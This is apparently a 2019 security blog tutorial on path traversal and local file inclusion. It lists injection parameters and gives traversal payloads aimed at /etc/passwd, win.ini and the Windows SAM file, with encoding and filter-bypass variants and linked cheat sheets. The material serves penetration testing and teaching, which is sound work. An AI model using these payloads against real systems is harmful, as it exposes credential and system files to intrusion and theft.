---
title:  "Directory/Path Traversal & LFI/RFI"
date:   2019-08-20 12:20:15 +0800
categories: Hacking
classes:
  - landing
header:
  teaser: /assets/img/whitehat.jpg
---


## What is Directory/Path Traversal ?

•A path traversal attack (also known as directory traversal) aims
to access files and directories that are stored outside the web
root folder.

•By manipulating variables that reference files with “dot-dot-slash
(../)” sequences and its variations or by using absolute file
paths, it may be possible to access arbitrary files and directories
stored on file system including application source code or
configuration and critical system files

## How does it work ?

•file_read(“/htdocs/website/reports/” + user_input + “.pdf”)

```c
https://www.example.com/getfile?path=File2503sm
```


## Some common parameters or injection points
```c 
•file=
•location=
•lang=
• path=
• display=
•load=
•read=
•retrieve=

```

## Old school knowledge (1)

• Root folder
![](https://i.imgur.com/dL9jlpG.png)

•Directory separator symbols

![](https://i.imgur.com/CIwYSYV.png)

## Old school knowledge (2)
  • Move up the current directory

![](https://i.imgur.com/9Q5ajRy.png)

  • Terminate the current file name

![](https://i.imgur.com/F46WlQf.png)

## Detection

```code
•file=foo/file1.txt
• Try: file=foo/bar/../file1.txt
• Match => vulnerable
•Different => ???
```


## Basic directory/path traversal
 ```c 
 •../../../../../../../../../../../../../../etc/passwd
 •..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
 •If in write context, for Windows platforms
 • ../../../../../../../../../../../../writetest.txt
 • ../../../../../../../../../../../../windows/system32/config/sam
 • For Unix-based platforms
 • ../../../../../../../../../../../../tmp/writetest.txt
 • ../../../../../../../../../../../../tmp

If the second returns an error message but first does not, the application probably is vulnerable.
```

## Bypass waf/filter (1)

•URL encode
```c
  • . => %2e
  • / => %2f
  • \ => %5c
 ../ => %2e%2e%2f, %2e%2e/, ..%2f
 ..\ => %2e%2e%5c, %2e%2e\, ..%5c
 ```
•Double url encode
```c
  • ../ => %252e%252e%252f and so on
  • ..\ => %252e%252e%255c and so 
```

## Bypass waf/filter (2)

• 16-bit Unicode-Encoding
```c
  • . => %u002e
  • / => %u2215
  • \ => %u2216
```
•Overlong UTF-8 Unicode-Encoding
```c
  • . => %c0%2e, %e0%40%ae, %c0ae, …
  • / => %c0%af, %e0%80%af, %c0%2, ...
  • \ => %c0%5c, %c0%80%5c
```

## Bypass waf/filter (3)

• Bypass sanitize user input by removing traversal sequences and does not apply this filter recursively
```c
  • ....//
  • ....\/
  • ..../\
  • .....\\
```  
•Using %00, %0a to bypass file type checking, file type inserting
```c
  • ../../../../../../../../etc/passwd%00
  • ../../../../../../../../etc/passwd%0a.jpg
```
## Bypass waf/filter (4)

• Some applications check whether the user-supplied file name starts
with a particular subdirectory of the start directory, or even a specific
file name.
```c
  • wahh-app/images/../../../../../../../etc/passwd
```

## Cheatsheets

![https://github.com/2503sm/2503sm.github.io/blob/master/attack/JHADDIX_LFI.txt](https://github.com/2503sm/2503sm.github.io/blob/master/attack/JHADDIX_LFI.txt)

![https://github.com/2503sm/2503sm.github.io/blob/master/attack/lfi.txt](https://github.com/2503sm/2503sm.github.io/blob/master/attack/lfi.txt)

![https://github.com/2503sm/2503sm.github.io/blob/master/attack/traversals-8-deep-exotic-encoding.txt](https://github.com/2503sm/2503sm.github.io/blob/master/attack/traversals-8-deep-exotic-encoding.txt)






















